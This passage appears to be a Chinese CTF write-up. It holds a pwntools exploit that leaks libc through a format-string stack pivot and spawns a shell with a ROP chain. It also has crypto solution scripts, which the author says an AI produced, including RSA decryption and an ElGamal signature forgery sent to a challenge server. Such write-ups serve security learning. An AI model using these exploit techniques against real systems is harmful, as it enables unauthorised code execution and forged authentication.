<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context(os= &#x27;linux&#x27;, arch = &#x27;amd64&#x27; , log_level = &#x27;debug&#x27;)<br><br>io = process(&#x27;./fmt&#x27;)<br>#io = remote(&#x27;IP&#x27;, PORT)<br><br>libc = ELF(&#x27;./libc.so.6&#x27;)<br>elf = ELF(&#x27;./fmt&#x27;)<br>def p():<br>    gdb.attach(proc.pidof(io)[0])<br><br><br>#--------------------------------------------<br><br>buf = 0x00000000004040A0<br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>rop_ret_1 = 0x0000000000401243<br><br>#--------------------------------------------<br><br>#先进行栈转移<br>payload1 = b&#x27;&#x27;<br>addr = b&#x27;%&#x27; + str(buf+0xa0).encode() + b&#x27;c&#x27; + b&#x27;%8$ln&#x27;<br>payload1 += addr.ljust(0xa0, b&#x27;\x00&#x27;)<br>payload1 += p64(buf+0xa0)<br>payload1 += p64(puts_plt)<br>payload1 += p64(rop_ret_1)<br>#栈迁移成功并泄露出libc中的一个地址<br><br>io.recvuntil(b&#x27;you have one chance .\n&#x27;)<br>p()<br>io.sendline( payload1 )<br><br>#计算libc_base<br>io.recvuntil(b&#x27;\x20\xa0&#x27;)<br>libc_base=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;)) - 0x062050<br>print(&quot;libc_base= &quot;+hex(libc_base))<br>#构建syscall rop链<br><br>#---------------------------------------------------------<br>rdi=libc_base+0x000000000002a3e5<br>rsi=libc_base+0x000000000002be51<br>rdx_12=libc_base+0x000000000011f2e7<br>rax=libc_base+0x0000000000045eb0<br>syscall=libc_base+0x1147E0<br>binsh=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))<br>#---------------------------------------------------------<br><br>payload=b&#x27;a&#x27;*0xb0+p64(rdi)+p64(binsh)+p64(rsi)+p64(0)+p64(rdx_12)+p64(0)+p64(0)+p64(rax)+p64(0x3b)+p64(syscall)<br><br># p()<br><br>io.recvuntil(b&quot;you have one chance .\n&quot;)<br><br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>







<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p><strong>密码题均为拷打ai，本人不会</strong></p>
<h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python3">import gmpy2 # Using gmpy2 for efficient modular inverse calculation<br>import math<br><br># Given values from the CTF challenge<br>c = 52354976201766669118320630176887314071011255313891475177309220942626308982212207656434544882959155963535322671950878583826524168178944409579938839799964263156869607430342733103192161887476831655038675686355158926050329782714167002188689556206753594011414672752687969286190800625479272347359078146861058813575<br>e = 65537<br>n = 128695631920242750589686556821575285363077338716894598150505853922988731458730235702902751496167097055081015591831536126839547857423987907590407313564456519185448221625668476322936885010691918434072938135430858464606477495727174799865802582744611435244880867181739290162314813391707310015481379681575178925149<br><br># Step 1: Check if n is prime (optional, but good practice)<br># We already confirmed this using external tools/information<br># For a programmatic check (can be slow for large n):<br># if not gmpy2.is_prime(n):<br>#     print(&quot;Error: n is not prime, but the challenge implies it is.&quot;)<br>#     exit()<br># else:<br>#     print(&quot;Confirmed: n is prime.&quot;)<br><br># Step 2: Calculate Euler&#x27;s totient function for a prime n, which is phi(n) = n - 1<br>phi_n = n - 1<br>print(f&quot;Since n is prime, phi(n) = n - 1 = &#123;phi_n&#125;\n&quot;)<br><br># Step 3: Calculate the private exponent d, which is the modular multiplicative inverse of e modulo phi(n)<br># d * e ≡ 1 (mod phi(n))<br>try:<br>    # Ensure e and phi_n are coprime<br>    if gmpy2.gcd(e, phi_n) != 1:<br>         print(f&quot;Error: e (&#123;e&#125;) and phi_n (&#123;phi_n&#125;) are not coprime. gcd = &#123;gmpy2.gcd(e, phi_n)&#125;&quot;)<br>         print(&quot;Decryption is not possible with this e.&quot;)<br>    else:<br>        d = gmpy2.invert(e, phi_n)<br>        print(f&quot;Calculated private exponent d = &#123;d&#125;\n&quot;)<br><br>        # Step 4: Decrypt the ciphertext c to get the plaintext message m<br>        # m = c^d mod n<br>        # Use the built-in pow(base, exponent, modulus) for efficiency<br>        m_int = pow(c, d, n)<br>        print(f&quot;Decrypted integer m = &#123;m_int&#125;\n&quot;)<br><br>        # Step 5: Convert the resulting integer m into bytes, then decode into a string<br>        # The number of bytes needed is ceil(log2(m) / 8)<br>        # or more simply (m.bit_length() + 7) // 8<br>        byte_length = (m_int.bit_length() + 7) // 8<br>        m_bytes = m_int.to_bytes(byte_length, &#x27;big&#x27;) # &#x27;big&#x27; means most significant byte first<br><br>        print(f&quot;Decrypted bytes = &#123;m_bytes&#125;\n&quot;)<br><br>        # Try decoding the bytes as UTF-8 (common for flags) or ASCII<br>        try:<br>            m_str = m_bytes.decode(&#x27;utf-8&#x27;)<br>            print(f&quot;Decrypted string (UTF-8): &#123;m_str&#125;&quot;)<br>        except UnicodeDecodeError:<br>            try:<br>                m_str = m_bytes.decode(&#x27;ascii&#x27;)<br>                print(f&quot;Decrypted string (ASCII): &#123;m_str&#125;&quot;)<br>            except UnicodeDecodeError as e:<br>                print(f&quot;Could not decode bytes into a readable string: &#123;e&#125;&quot;)<br>                print(&quot;The result might be raw bytes or require different decoding.&quot;)<br><br>except ValueError:<br>    # This specific error might not be reachable if gcd check is done first,<br>    # but kept for robustness. gmpy2.invert raises ZeroDivisionError if modulus is 1 or less.<br>    print(f&quot;Error calculating modular inverse. Is phi_n valid?&quot;)<br></code></pre></td></tr></table></figure>

<h3 id="Whereisp-q"><a href="#Whereisp-q" class="headerlink" title="Whereisp&amp;q"></a>Whereisp&amp;q</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python3">import math<br>from Crypto.Util.number import long_to_bytes<br><br># --- 从问题描述中获取的已知值 ---<br>N = 70043427687738872803871163276488213173780425282753969243938124727004843810522473265066937344440899712569316720945145873584064860810161865485251816597432836666987134938760506657782143983431621481190009008491725207321741725979791393566155990005404328775785526238494554357279069151540867533082875900530405903003<br>enc_flag = 20797621445779853622774031988797057713071576485981176620438476287691431211827108973711188565531231624908250816829606043339050674851955845245175767829499048697190880649138351268910380674343685058356646195398107343184004661886569002983286808168852810944626906687603677922754297685190621595441100414259760595685<br>a = 8369195163678456889416121467476480674288621867182572824570660596055739410903686466334448920102666056798356927389728982948229326705483052970212882852055482<br>b = 25500181489306553053743739056022091355379036380919737553326529889338409847082228856006303427136881468093863020843230477979<br>c = 8369195163678456889416121462308686152524805984209312455308229689034789710117101859597220211456125364647704791637845189120538925088375209397006380815921158<br>d = 31448594528370020763962343185054872105044827103889010592635556324009793301024988530934510929565983517651356856506719032859<br><br># --- 步骤 1: 计算公共指数 e ---<br># N = a^2 + e*b^2  =&gt; e = (N - a^2) / b^2<br># N = c^2 + e*d^2  =&gt; e = (N - c^2) / d^2<br>e1 = (N - a*a) // (b*b)<br>e2 = (N - c*c) // (d*d)<br><br># 验证两个方程计算出的 e 是否相同<br>assert e1 == e2<br>e = e1<br>print(f&quot;[+] 计算得到公共指数 e = &#123;e&#125;&quot;)<br>print(f&quot;    e 的比特长度: &#123;e.bit_length()&#125;&quot;)<br><br><br># --- 步骤 2: 使用 Brillhart 方法分解 N ---<br># 基于 N = a^2 + eb^2 = c^2 + ed^2<br># 计算 k = ad - bc<br># 计算 g = gcd(N, k)。如果 1 &lt; g &lt; N, 则 g 是 N 的一个因子<br>k = a*d - b*c<br>print(f&quot;[+] 计算 k = ad - bc = &#123;k&#125;&quot;)<br><br># 使用 math.gcd 计算最大公约数<br>g = math.gcd(N, k)<br>print(f&quot;[+] 计算 g = gcd(N, k) = &#123;g&#125;&quot;)<br><br># 检查 g 是否是一个非平凡因子<br>if 1 &lt; g &lt; N:<br>    p = g<br>    q = N // g<br>    print(f&quot;[+] 成功找到因子:&quot;)<br>    print(f&quot;    p = &#123;p&#125;&quot;)<br>    print(f&quot;    q = &#123;q&#125;&quot;)<br>    # 验证 p * q 是否等于 N<br>    assert p * q == N<br>else:<br>    # 如果 gcd(N, ad-bc) 失败，可以尝试 gcd(N, ac+ebd)<br>    # 但在这个问题中，通常 gcd(N, ad-bc) 会成功<br>    print(&quot;[-] 使用 gcd(N, ad-bc) 分解失败，可以尝试其他方法（例如 gcd(N, ac+ebd)），但在此省略。&quot;)<br>    exit() # 如果分解失败则退出<br><br><br># --- 步骤 3: 计算 RSA 私钥 ---<br># 计算欧拉函数 phi(N) = (p-1)*(q-1)<br>phi = (p - 1) * (q - 1)<br>print(f&quot;[+] 计算 phi(N) = &#123;phi&#125;&quot;)<br><br># 计算私钥 d_priv，它是 e 模 phi(N) 的乘法逆元<br># d_priv = e^(-1) mod phi<br>d_priv = pow(e, -1, phi)<br>print(f&quot;[+] 计算得到私钥 d_priv = &#123;d_priv&#125;&quot;)<br><br><br># --- 步骤 4: 解密消息 ---<br># m = enc_flag ^ d_priv mod N<br>m = pow(enc_flag, d_priv, N)<br>print(f&quot;[+] 解密得到消息整数 m = &#123;m&#125;&quot;)<br><br><br># --- 步骤 5: 将消息整数转换回字节 ---<br>flag = long_to_bytes(m)<br>print(f&quot;[+] 将 m 转换回字节:&quot;)<br><br># --- 输出最终的 Flag ---<br># 使用 try-except 来处理可能的解码错误（尽管通常是 utf-8）<br>try:<br>    print(f&quot;\n[*] Flag: &#123;flag.decode(&#x27;utf-8&#x27;)&#125;&quot;)<br>except UnicodeDecodeError:<br>    print(f&quot;\n[*] Flag (字节形式): &#123;flag&#125;&quot;)<br></code></pre></td></tr></table></figure>

<h3 id="stream-block"><a href="#stream-block" class="headerlink" title="stream&amp;block"></a>stream&amp;block</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python3<br>from pwn import *<br>import sys<br><br># Define the action function locally for checking<br>def action(msg):<br>    r = 0<br>    for b in msg:<br>        r ^= b<br>    return r<br><br># --- Connection Details ---<br>HOST = &quot;210.30.97.133&quot;<br>PORT = 10003<br><br># Set context for architecture, os, etc. (optional but good practice)<br>context.log_level = &#x27;info&#x27; # Set to &#x27;debug&#x27; for more verbose output<br><br># Connect to the server<br>try:<br>    conn = remote(HOST, PORT)<br>except PwnlibException as e:<br>    log.error(f&quot;Failed to connect to &#123;HOST&#125;:&#123;PORT&#125; - &#123;e&#125;&quot;)<br>    sys.exit(1)<br><br># Read the initial banner<br>try:<br>    conn.recvuntil(b&#x27; &gt; &#x27;)<br>except EOFError:<br>    log.error(&quot;Connection closed immediately after connect.&quot;)<br>    sys.exit(1)<br><br><br>log.info(&quot;Starting probe...&quot;)<br>good_ops = []<br><br>for op in range(256):<br>    # Construct probe P<br>    # If op is 0, use all null bytes. Otherwise, use byte(op) followed by null bytes.<br>    p_bytes = bytes([op]) + b&#x27;\x00&#x27; * 15 if op != 0 else b&#x27;\x00&#x27; * 16<br>    p_hex = p_bytes.hex()<br><br>    log.debug(f&quot;Testing op=&#123;op&#125;, P_hex=&#123;p_hex&#125;&quot;)<br><br>    try:<br>        # Send choice 1 (Encrypt)<br>        conn.sendline(b&#x27;1&#x27;)<br>        # Send plaintext hex<br>        conn.sendlineafter(b&#x27;input your plaintext(hex) &gt; &#x27;, p_hex.encode())<br>        # Receive response<br>        response_line = conn.recvline().decode().strip()<br>        log.debug(f&quot;Raw response for op=&#123;op&#125;: &#123;response_line&#125;&quot;)<br><br>        # Parse ciphertext hex<br>        if response_line.startswith(&quot;encrypted ciphertext: &quot;):<br>            c_hex = response_line.split(&quot;encrypted ciphertext: &quot;)[1]<br>            c_bytes = bytes.fromhex(c_hex)<br><br>            # Check action<br>            act_c = action(c_bytes)<br>            log.debug(f&quot;op=&#123;op&#125;, action(P)=&#123;op&#125;, action(C)=&#123;act_c&#125;&quot;)<br>            if act_c == op:<br>                log.success(f&quot;*** Found good op: &#123;op&#125; ***&quot;)<br>                good_ops.append(op)<br>        else:<br>             log.warning(f&quot;Unexpected response format for op=&#123;op&#125;: &#123;response_line&#125;&quot;)<br><br>        # Ready for the next command<br>        conn.recvuntil(b&#x27; &gt; &#x27;)<br><br>    except EOFError:<br>        log.error(&quot;Connection closed unexpectedly during loop.&quot;)<br>        sys.exit(1)<br>    except ValueError as e:<br>        log.error(f&quot;Hex decoding error for op=&#123;op&#125;, response: &#123;response_line&#125; - &#123;e&#125;&quot;)<br>        # Try to recover by reading until the next prompt<br>        try:<br>            conn.recvuntil(b&#x27; &gt; &#x27;)<br>        except EOFError:<br>            log.error(&quot;Connection closed while trying to recover from hex error.&quot;)<br>            sys.exit(1)<br>    except Exception as e:<br>        log.error(f&quot;An error occurred for op=&#123;op&#125;: &#123;e&#125;&quot;)<br>        # Try to recover<br>        try:<br>            conn.recvuntil(b&#x27; &gt; &#x27;)<br>        except EOFError:<br>            log.error(&quot;Connection closed while trying to recover from general error.&quot;)<br>            sys.exit(1)<br><br><br>log.info(f&quot;Finished probing. Good ops found: &#123;good_ops&#125;&quot;)<br><br>if not good_ops:<br>    log.error(&quot;No suitable op found. Cannot proceed.&quot;)<br>else:<br>    # Choose the first good op found<br>    chosen_op = good_ops[0]<br>    log.info(f&quot;Using op = &#123;chosen_op&#125; for the magic text.&quot;)<br><br>    # Construct the magic block based on the chosen op<br>    p_good_bytes = bytes([chosen_op]) + b&#x27;\x00&#x27; * 15 if chosen_op != 0 else b&#x27;\x00&#x27; * 16<br><br>    # Construct the final message (4 blocks = 64 bytes &gt;= 50 bytes required)<br>    magic_msg_bytes = p_good_bytes * 4<br>    magic_msg_hex = magic_msg_bytes.hex()<br><br>    log.info(f&quot;Constructed magic message (hex): &#123;magic_msg_hex&#125;&quot;)<br><br>    try:<br>        # Send choice 3 (Verify)<br>        conn.sendline(b&#x27;3&#x27;)<br>        log.info(&quot;Sent choice 3 (Verify)&quot;)<br><br>        # Send the magic message hex<br>        conn.sendlineafter(b&#x27;input your text(hex) &gt; &#x27;, magic_msg_hex.encode())<br>        log.info(&quot;Sent magic text&quot;)<br><br>        # Receive the final response (hopefully the flag)<br>        final_response = conn.recvall(timeout=3).decode() # Adjust timeout if needed<br>        log.success(&quot;Received final response:&quot;)<br>        print(&quot;\n&quot; + &quot;=&quot;*20 + &quot; FINAL SERVER RESPONSE &quot; + &quot;=&quot;*20)<br>        print(final_response)<br>        print(&quot;=&quot;*61)<br><br>    except EOFError:<br>        log.error(&quot;Connection closed before receiving the final response.&quot;)<br>    except Exception as e:<br>        log.error(f&quot;An error occurred during verification: &#123;e&#125;&quot;)<br><br># Close the connection (pwntools usually handles this, but explicit is fine)<br>conn.close()<br>log.info(&quot;Connection closed.&quot;)<br></code></pre></td></tr></table></figure>

<h3 id="signature2"><a href="#signature2" class="headerlink" title="signature2"></a>signature2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python3<br>from pwn import *<br>from Crypto.Util.number import inverse, long_to_bytes, GCD<br><br># Connection details from the challenge description<br>HOST = &quot;210.30.97.133&quot;<br>PORT = 10095<br><br># Start connection<br>log.info(f&quot;Connecting to &#123;HOST&#125;:&#123;PORT&#125;&quot;)<br>conn = remote(HOST, PORT)<br><br># Receive public key<br>conn.recvuntil(b&quot;This is your Public key: (&quot;)<br>p_str = conn.recvuntil(b&quot;, &quot;, drop=True)<br>g_str = conn.recvuntil(b&quot;, &quot;, drop=True)<br>y_str = conn.recvuntil(b&quot;)&quot;, drop=True)<br><br>p = int(p_str)<br>g = int(g_str)<br>y = int(y_str)<br><br>log.success(f&quot;Received Public Key:&quot;)<br>log.info(f&quot;  p = &#123;p&#125;&quot;)<br>log.info(f&quot;  g = &#123;g&#125;&quot;)<br>log.info(f&quot;  y = &#123;y&#125;&quot;)<br><br># Send a dummy message (its signature will be ignored)<br>conn.recvuntil(b&quot;Please tell me what you want to sign:\n&gt; &quot;)<br>dummy_msg = b&quot;initial_message&quot;<br>conn.sendline(dummy_msg)<br>log.info(f&quot;Sent dummy message: &#123;dummy_msg&#125;&quot;)<br><br># Receive the dummy signature (and ignore it)<br>conn.recvuntil(b&quot;Your signature is: (&quot;)<br>conn.recvuntil(b&quot;)&quot;) # Consume the signature line<br>log.info(&quot;Received and ignored dummy signature.&quot;)<br><br># --- Perform Existential Forgery ---<br>log.info(&quot;Calculating forged signature...&quot;)<br>u = 1<br>v = 1<br>p_minus_1 = p - 1<br><br># Ensure v is coprime to p-1 (v=1 is always coprime)<br>assert GCD(v, p_minus_1) == 1, &quot;v must be coprime to p-1&quot;<br><br># 1. Calculate r&#x27; = (g^u * y^v) % p<br>r_prime = (pow(g, u, p) * pow(y, v, p)) % p<br><br># 2. Calculate s&#x27; = (-r&#x27; * inverse(v, p-1)) % (p-1)<br>try:<br>    v_inv = inverse(v, p_minus_1)<br>except ValueError:<br>    log.error(f&quot;Inverse of v=&#123;v&#125; mod p-1=&#123;p_minus_1&#125; does not exist!&quot;)<br>    conn.close()<br>    exit()<br># Need to compute -r&#x27; mod (p-1). Ensure r&#x27; is reduced if needed, though result of pow gives 0 &lt;= r&#x27; &lt; p.<br># The modulo operation requires the argument to be non-negative sometimes depending on language/library.<br># (-r_prime * v_inv) % p_minus_1 handles this correctly in Python.<br>s_prime = (-r_prime * v_inv) % p_minus_1<br><br># 3. Calculate m&#x27; = (s&#x27; * u) % (p-1)<br>m_prime = (s_prime * u) % p_minus_1<br><br>log.success(&quot;Calculated Forged Signature Components:&quot;)<br>log.info(f&quot;  m&#x27; = &#123;m_prime&#125;&quot;)<br>log.info(f&quot;  r&#x27; = &#123;r_prime&#125;&quot;)<br>log.info(f&quot;  s&#x27; = &#123;s_prime&#125;&quot;)<br><br># Sanity check: verify locally (optional)<br>lhs = pow(g, m_prime, p)<br>rhs = (pow(y, r_prime, p) * pow(r_prime, s_prime, p)) % p<br>if lhs == rhs:<br>    log.info(&quot;Local verification successful!&quot;)<br>else:<br>    log.warning(&quot;Local verification failed! Something might be wrong.&quot;)<br>    # continue anyway, maybe a calculation nuance<br><br># Check if the forged message m&#x27; would convert to the same bytes as the dummy message<br>try:<br>    m_prime_bytes = long_to_bytes(m_prime)<br>    if m_prime_bytes == dummy_msg:<br>        log.error(&quot;Forged message m&#x27; is the same as the initial dummy message!&quot;)<br>        log.error(&quot;Attack will fail. Try different u, v or dummy_msg.&quot;)<br>        conn.close()<br>        exit()<br>except ValueError:<br>    # If m_prime is 0, long_to_bytes might give empty bytes b&#x27;&#x27;<br>    if m_prime == 0 and dummy_msg == b&#x27;&#x27;:<br>         log.error(&quot;Forged message m&#x27;=0 might conflict with empty dummy message!&quot;)<br>         # Handle this case if needed, but unlikely with non-empty dummy_msg<br>    # Otherwise, it&#x27;s fine, m&#x27;=0 -&gt; b&#x27;&#x27; is different from non-empty dummy_msg<br>    pass<br><br><br># Send the forged message and signature<br>log.info(&quot;Sending forged message and signature...&quot;)<br>conn.recvuntil(b&quot;m: &quot;)<br>conn.sendline(str(m_prime).encode())<br>log.info(f&quot;Sent m&#x27;: &#123;m_prime&#125;&quot;)<br><br>conn.recvuntil(b&quot;r: &quot;)<br>conn.sendline(str(r_prime).encode())<br>log.info(f&quot;Sent r&#x27;: &#123;r_prime&#125;&quot;)<br><br>conn.recvuntil(b&quot;s: &quot;)<br>conn.sendline(str(s_prime).encode())<br>log.info(f&quot;Sent s&#x27;: &#123;s_prime&#125;&quot;)<br><br># Receive the flag or error message<br>log.info(&quot;Waiting for response...&quot;)<br>response = conn.recvall(timeout=5)<br><br>log.success(&quot;Received response:&quot;)<br>print(response.decode())<br><br>conn.close()<br>log.info(&quot;Connection closed.&quot;)<br></code></pre></td></tr></table></figure>

